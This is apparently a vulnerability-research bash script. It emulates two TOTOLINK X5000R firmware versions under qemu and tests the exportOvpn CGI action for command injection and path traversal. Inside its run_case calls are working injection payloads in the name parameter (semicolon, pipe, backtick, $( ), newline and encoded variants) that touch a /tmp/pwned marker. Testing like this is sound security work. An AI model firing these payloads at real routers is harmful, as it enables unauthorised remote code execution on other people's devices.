#!/usr/bin/env bash
set -euo pipefail

LATEST="/root/inout/firmware/unpacked/totolink/CS_C8344R_X5000R_IP04433_MT7621MT7915_SPI_16M256M_V9.1.0cu.2415_B20250515_ALL/_CS_C8344R_X5000R_IP04433_MT7621MT7915_SPI_16M256M_V9.1.0cu.2415_B20250515_ALL.web.extracted/squashfs-root"
OLD="/root/inout/firmware/unpacked/totolink/TOTOLINK_C8344R_X5000R_IP04433_MT7621MT7915_SPI_16M256M_V9.1.0cu.2350_B20230313_ALL/_TOTOLINK_C8344R_X5000R_IP04433_MT7621MT7915_SPI_16M256M_V9.1.0cu.2350_B20230313_ALL.web.extracted/squashfs-root"
BASE="/root/inout/work/deepdive/exportovpn_real_shell_rce"

rm -rf "$BASE"
mkdir -p "$BASE"

make_env() {
  local src="$1"
  local dst="$2"

  cp -a "$src" "$dst/rootfs"
  rm -f "$dst/rootfs/var"
  mkdir -p "$dst/rootfs/tmp" "$dst/rootfs/var/cste" "$dst/rootfs/etc/openvpn/server/user" "$dst/rootfs/usr/bin"
  cp /usr/bin/qemu-mipsel-static "$dst/rootfs/usr/bin/qemu-mipsel-static"

  cat > "$dst/rootfs/usr/bin/openvpn-cert" <<'EOF'
#!/bin/sh
echo "openvpn-cert argv: $*" >> /tmp/openvpn-cert.argv.log
case "$1:$3" in
  build_user:config)
    mkdir -p /etc/openvpn/server/user
    echo "GENERATED_OVPN_FOR_$2" > "/etc/openvpn/server/user/$2.ovpn"
    ;;
  build_user:gz)
    mkdir -p /etc/openvpn/server/user
    echo "GENERATED_TARGZ_FOR_$2" > "/etc/openvpn/server/user/$2.tar.gz"
    ;;
esac
exit 0
EOF
  chmod 0755 "$dst/rootfs/usr/bin/openvpn-cert"
}

run_case() {
  local dst="$1"
  local name="$2"
  local qs="$3"
  local out="$dst/out_${name}.txt"

  rm -f "$dst/rootfs/tmp/pwned" "$dst/rootfs/tmp/openvpn-cert.argv.log"
  env -i \
    QUERY_STRING="$qs" \
    CONTENT_LENGTH=0 \
    REQUEST_METHOD=GET \
    REMOTE_ADDR=127.0.0.1 \
    PATH="/bin:/usr/bin:/usr/sbin:/sbin" \
    chroot "$dst/rootfs" /usr/bin/qemu-mipsel-static -L / /web/cgi-bin/cstecgi.cgi \
    </dev/null >"$out" 2>&1 || true

  {
    echo "===== $name ====="
    printf '%s\n' "$qs"
    echo "--- response tail ---"
    tail -15 "$out"
    echo "--- argv log ---"
    cat "$dst/rootfs/tmp/openvpn-cert.argv.log" 2>/dev/null || true
    echo "--- pwned marker ---"
    if [ -e "$dst/rootfs/tmp/pwned" ]; then
      echo "PWNED_MARKER_PRESENT"
      cat "$dst/rootfs/tmp/pwned" || true
    else
      echo "no marker"
    fi
  } >> "$dst/summary.txt"
}

probe_version() {
  local label="$1"
  local src="$2"
  local dst="$BASE/$label"

  mkdir -p "$dst"
  make_env "$src" "$dst"
  : > "$dst/summary.txt"

  run_case "$dst" baseline 'exportOvpn&type=user&name=alice&mode=config'
  run_case "$dst" semicolon 'exportOvpn&type=user&name=a;touch /tmp/pwned&mode=config'
  run_case "$dst" pipe 'exportOvpn&type=user&name=a|touch /tmp/pwned&mode=config'
  run_case "$dst" backtick 'exportOvpn&type=user&name=a`touch /tmp/pwned`&mode=config'
  run_case "$dst" dollar_paren 'exportOvpn&type=user&name=a$(touch /tmp/pwned)&mode=config'
  run_case "$dst" raw_lf $'exportOvpn&type=user&name=a\ntouch /tmp/pwned&mode=config'
  run_case "$dst" raw_cr $'exportOvpn&type=user&name=a\rtouch /tmp/pwned&mode=config'
  run_case "$dst" raw_tab $'exportOvpn&type=user&name=a\ttouch /tmp/pwned&mode=config'
  run_case "$dst" space_arg 'exportOvpn&type=user&name=a touch /tmp/pwned&mode=config'
  run_case "$dst" encoded_semicolon 'exportOvpn&type=user&name=a%3btouch%20/tmp/pwned&mode=config'
  run_case "$dst" encoded_lf 'exportOvpn&type=user&name=a%0atouch%20/tmp/pwned&mode=config'
  run_case "$dst" traversal 'exportOvpn&type=user&name=../passwd&mode=config'

  {
    echo "### $label"
    cat "$dst/summary.txt"
  } | tee "$dst/evidence.txt"
}

probe_version latest "$LATEST"
probe_version old "$OLD"

cat "$BASE/latest/evidence.txt" "$BASE/old/evidence.txt" > "$BASE/combined_evidence.txt"
echo "$BASE/combined_evidence.txt"
